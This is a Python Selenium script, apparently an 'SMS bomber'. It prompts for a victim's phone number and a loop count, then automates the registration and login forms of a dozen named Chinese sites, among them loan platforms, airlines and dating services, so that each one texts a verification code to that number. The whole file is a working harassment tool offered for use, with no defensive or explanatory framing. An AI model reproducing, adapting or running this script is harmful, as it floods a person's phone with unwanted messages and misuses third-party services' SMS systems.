from selenium import webdriver
from selenium.webdriver import ActionChains
import time
import threading

#360借条
def send_360(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://www.360jie.com.cn/')
    browser.find_element_by_name("mobile").send_keys(phon_num)
    browser.find_element_by_id('btnSendCode1').click()
    time.sleep(5)
    browser.close()

#拍拍贷
def send_paipai(phon_num):

    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    key = "8263abd"
    browser.get("https://account.ppdai.com/pc/login")
    browser.find_element_by_class_name("login_toRegister").click()
    browser.find_element_by_name("Mobile").send_keys(phon_num)
    browser.find_element_by_name("Password").send_keys(key)
    browser.find_element_by_id("getvefydata").click()
    time.sleep(5)
    browser.close()

#饿了么开放平台
def send_ele(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://open.shop.ele.me/openapi/register')
    browser.find_element_by_class_name('el-checkbox__inner').click()
    time.sleep(3)
    browser.find_element_by_xpath("//*[@class='el-button btn-next-step el-button--primary']").click()
    time.sleep(4)
    browser.find_element_by_class_name('el-input__inner').send_keys(phon_num)
    browser.find_element_by_class_name('btn-verifyCode').click()
    time.sleep(4)
    browser.close()

#瓜子二手车
def send_guazi(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome()
    browser.get('https://www.guazi.com/nanchong/')
    time.sleep(1)
    browser.find_element_by_xpath("//*[@class='close js-close-finance-pop']").click()
    time.sleep(2)
    browser.find_element_by_id('js-login-new').click()
    time.sleep(1)
    browser.find_element_by_name('phone').send_keys(phon_num)
    time.sleep(1)
    browser.find_element_by_class_name('get-code').click()
    time.sleep(4)
    browser.close()

#凤凰智信
def send_fenghuang(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://www.fengwd.com/')
    time.sleep(1)
    browser.find_element_by_xpath("//*[@class='top-bar-item login-tag']/a").click()
    time.sleep(2)
    browser.find_element_by_id('mobile_number').send_keys(phon_num)
    browser.find_element_by_xpath("//*[@class='get-sms-captcha blue']").click()
    time.sleep(4)
    browser.close()

#众房宝
def send_zongfangbao(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://www.zonefang.com/member/common/register')
    time.sleep(1)
    browser.find_element_by_class_name('phone').send_keys(phon_num)
    time.sleep(2)
    browser.find_element_by_class_name('pwd').send_keys('123456ydsa')
    time.sleep(1)
    browser.find_element_by_xpath("//*[@class='send_msg hand']").click()
    time.sleep(4)
    browser.close()

#百合相亲网
def send_baihe(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://my.baihe.com/register/?spm=2.13.24.69.99')
    time.sleep(1)
    browser.find_element_by_id('account').send_keys(phon_num)
    browser.find_element_by_id('mobileValiCode_btn').click()
    time.sleep(4)
    browser.close()

#四川航空
def send_sichuanair(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
    browser.find_element_by_name('mobilePhone').send_keys(phon_num)
    time.sleep(1)
    browser.find_element_by_id('sendSmsCode').click()
    time.sleep(6)
    browser.close()

#昆明航空
def send_airkunming(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://www.airkunming.com/#/user/register')
    browser.find_element_by_id('mobile').send_keys(phon_num)
    time.sleep(1)
    browser.find_element_by_xpath("//*[@class='sms-code']").click()
    time.sleep(4)
    browser.close()

#有赞开放平台
def send_youzan(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('https://console.youzanyun.com/register')
    browser.find_element_by_xpath("//*[@class = 'zent-input phone']").send_keys(phon_num)
    time.sleep(1)
    browser.find_element_by_xpath("//*[@class = 'sms-btn']").click()
    time.sleep(4)
    browser.close()

#安徽相亲网
def send_anhuixiangiqn(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('http://www.ahxiangqin.cn/index.php?c=passport&a=reg')
    browser.find_element_by_name('mobile').send_keys([phon_num])
    time.sleep(1)
    #browser.find_element_by_class_name('action-send-mobile-code get').click()
    browser.find_element_by_xpath("//*[@class = 'action-send-mobile-code get']").click()
    time.sleep(4)
    browser.close()

#我主良缘
def send_wozhuliangyuan(phon_num):
    option = webdriver.ChromeOptions()
    option.add_argument('headless')
    browser = webdriver.Chrome(chrome_options=option)
    browser.get('http://m.7799520.com/register.html')
    browser.find_element_by_name('mobile').send_keys([phon_num])
    time.sleep(1)
    bu = browser.find_elements_by_tag_name('button')
    for i in bu:
        i.click()
        time.sleep(2)
    browser.close()

if __name__ == "__main__":
    phon_num = input('输入轰炸的手机号:')
    run_roll = input('轰炸循环次数:')
    run_roll = int(run_roll)
    for _ in range(run_roll):
        #threading.Thread(target = send_baihe(phon_num)).start()
        threading.Thread(target = send_360(phon_num)).start()
        #threading.Thread(target = send_paipai(phon_num)).start()
        threading.Thread(target = send_ele(phon_num)).start()
        #threading.Thread(target = send_guazi(phon_num)).start()
        threading.Thread(target = send_fenghuang(phon_num)).start()
        #threading.Thread(target = send_zongfangbao(phon_num)).start()
        threading.Thread(target = send_sichuanair(phon_num)).start()
        threading.Thread(target = send_airkunming(phon_num)).start()
        threading.Thread(target = send_youzan(phon_num)).start()
        threading.Thread(target = send_anhuixiangiqn(phon_num)).start()
        threading.Thread(target = send_wozhuliangyuan(phon_num)).start()
        time.sleep(4)